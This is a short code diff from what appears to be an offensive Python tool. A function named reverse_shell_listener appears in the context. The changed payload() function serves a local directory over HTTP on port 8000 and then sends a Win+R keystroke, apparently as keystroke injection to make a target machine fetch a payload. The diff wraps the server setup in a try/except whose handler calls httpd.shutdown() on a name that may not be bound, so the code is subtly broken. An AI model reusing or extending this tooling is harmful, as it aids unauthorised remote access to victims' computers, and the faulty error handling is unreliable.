@@ -33,12 +33,15 @@ def reverse_shell_listener():
 
 
 def payload():
-	web_dir = os.path.join(os.path.dirname(__file__), 'http')
-	os.chdir(web_dir)
-	httpHandler = http.server.SimpleHTTPRequestHandler
-	httpd = socketserver.TCPServer(('',8000),httpHandler)
-	httplistener=Process(target=httpd.serve_forever)
-	httplistener.start()
+	try:
+		web_dir = os.path.join(os.path.dirname(__file__), 'http')
+		os.chdir(web_dir)
+		httpHandler = http.server.SimpleHTTPRequestHandler
+		httpd = socketserver.TCPServer(('',8000),httpHandler)
+		httplistener=Process(target=httpd.serve_forever)
+		httplistener.start()
+	except:
+		httpd.shutdown()
 	sleep(3)
 	eco.press("LGUI+R")
 	sleep(1)
